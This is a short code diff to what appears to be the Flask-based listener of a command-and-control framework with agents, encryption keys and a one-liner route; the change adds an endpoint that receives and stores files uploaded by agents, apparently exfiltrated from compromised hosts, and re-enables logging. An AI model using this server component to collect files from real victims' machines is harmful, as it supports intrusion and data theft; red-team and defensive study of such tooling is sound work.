@@ -2,6 +2,7 @@ from agent import Agent
 from agentshelpers import clearAgentTasks, displayResults
 from common import *
 from encryption import generateKey
+from werkzeug.utils import secure_filename
 
 import threading
 import logging
@@ -26,6 +27,7 @@ class Listener:
         self.keyPath    = "{}key".format(self.Path)
         self.filePath   = "{}files/".format(self.Path)
         self.agentsPath = "{}agents/".format(self.Path)
+        self.downPath   = "{}/downloads/".format(self.Path)
         self.isRunning  = False
         self.app        = flask.Flask(__name__)
 
@@ -37,6 +39,9 @@ class Listener:
 
         if os.path.exists(self.filePath) == False:
             os.mkdir(self.filePath)
+
+        if os.path.exists(self.downPath) == False:
+            os.mkdir(self.downPath)
 
         if os.path.exists(self.keyPath) == False:
             
@@ -92,8 +97,26 @@ class Listener:
         
             return (oneliner, 200)
 
+        @self.app.route("/receiver/<name>", methods=['POST'])
+        def receiveFile(name):
+            print(f'\nReceiving File:')
+            # check if the post request has the file part
+            if 'file' not in flask.request.files:
+                print('No file part')
+                return ('', 204)
+            file = flask.request.files['file']
+            # If the user does not select a file, the browser submits an empty file without a filename.
+            if file.filename == '':
+                print('No selected file')
+                return ('', 204)
+            if file:
+                filename = secure_filename(file.filename)
+                success("{} saved in: {}".format(filename, self.downPath))
+                file.save(os.path.join(self.downPath, filename))
+                return (f'Uploaded file: {file.filename}', 201)
+
     def run(self):
-        self.app.logger.disabled = True
+        self.app.logger.disabled = False
         self.app.run(port=self.port, host=self.ipaddress)
 
     def setFlag(self):
